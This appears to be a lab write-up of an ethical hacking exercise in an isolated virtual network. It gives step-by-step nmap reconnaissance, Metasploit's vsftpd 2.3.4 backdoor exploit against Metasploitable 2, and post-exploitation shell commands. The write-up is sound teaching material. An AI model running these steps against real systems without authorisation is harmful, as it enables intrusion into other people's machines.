# Experiment 2: Simulated Ethical Hacking with Metasploit

## Overview

This experiment demonstrates a basic ethical hacking process using the **Metasploit Framework** in a controlled virtual lab environment. Kali Linux is used as the attacking machine, while Metasploitable 2 acts as the vulnerable target machine.

The experiment covers network reconnaissance, vulnerability identification, exploitation, and basic post-exploitation activities using a known vulnerable FTP service (vsftpd 2.3.4).

## Objective

To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.

## Environment and Tools Used

- **Kali Linux** – Attacker machine.
- **Metasploitable 2** – Vulnerable target machine.
- **Metasploit Framework** – Exploitation framework.
- **Nmap** – Network scanning and reconnaissance.
- **VirtualBox / VMware** – Virtualization platform.
- **Host-Only Adapter / Internal Network** – Isolated lab networking.

## Methodology

### Step 1: Configure Virtual Machines

1. Install Kali Linux and Metasploitable 2.
2. Open VirtualBox or VMware.
3. Configure both virtual machines using a Host-Only Adapter or Internal Network.
4. Start both virtual machines.

### Step 2: Verify Network Connectivity

Check the IP address of Metasploitable 2.

**On Metasploitable 2:**

```bash
ifconfig
```

**On Kali Linux:**

```bash
ping 192.168.42.136
```

Verify that both machines can communicate with each other.

### Step 3: Perform Reconnaissance

Use Nmap to identify open ports, running services, and operating system details.

```bash
nmap -sS -sV -O 192.168.42.136
```

### Step 4: Save Nmap Results

Save the scan results into a text file for documentation.

```bash
nmap -sS -sV -O -oN metasploitable_scan.txt 192.168.42.136
```

### Step 5: Launch Metasploit

Start the Metasploit Framework from the Kali Linux terminal.

```bash
msfconsole
```

### Step 6: Search for the Exploit

Search for the known vsftpd 2.3.4 backdoor vulnerability.

```bash
search vsftpd
```

### Step 7: Select the Exploit Module

Select the appropriate Metasploit exploit module.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 8: Set the Target Host

Configure the IP address of the Metasploitable 2 machine.

```bash
set RHOST 192.168.42.136
```

### Step 9: Set the Target Port

Set the FTP service port.

```bash
set RPORT 21
```

### Step 10: Execute the Exploit

Run the selected exploit against the authorized test machine.

```bash
exploit
```

### Step 11: Verify the Shell and System Information

If the exploitation is successful and a command shell is opened, verify the target system information.

```bash
whoami
uname -a
ifconfig
```

### Step 12: Check Processes and Network Services

View the running processes and listening network services.

```bash
ps aux
netstat -tulnp
```

### Step 13: Create and View a Test File

Create a temporary test file to verify basic file operations on the target machine.

```bash
echo "This is a test file" > /tmp/test.txt
cat /tmp/test.txt
```

## Expected Observations

- Successful communication between Kali Linux and Metasploitable 2.
- Identification of open ports and vulnerable FTP services using Nmap.
- Detection of the vsftpd 2.3.4 service.
- Selection and execution of the corresponding Metasploit module.
- Verification of shell access, if exploitation succeeds.
- Observation of system information, processes, and network services.

## Result

The target machine was scanned, a known vulnerable FTP service was identified, and a controlled exploitation exercise was performed using the Metasploit Framework in an isolated virtual lab environment.

## Conclusion

This experiment demonstrated the basic stages of ethical hacking, including reconnaissance, vulnerability identification, exploitation, and post-exploitation. Nmap helped identify the vulnerable service, while Metasploit was used to perform the controlled exploitation exercise.

## Ethical Considerations

- Perform exploitation only on authorized test machines.
- Use Metasploitable 2 as the vulnerable target.
- Keep the lab isolated from public and production networks.
- Never attempt exploitation on systems without permission.
- Use the knowledge gained to understand vulnerabilities and improve system security.


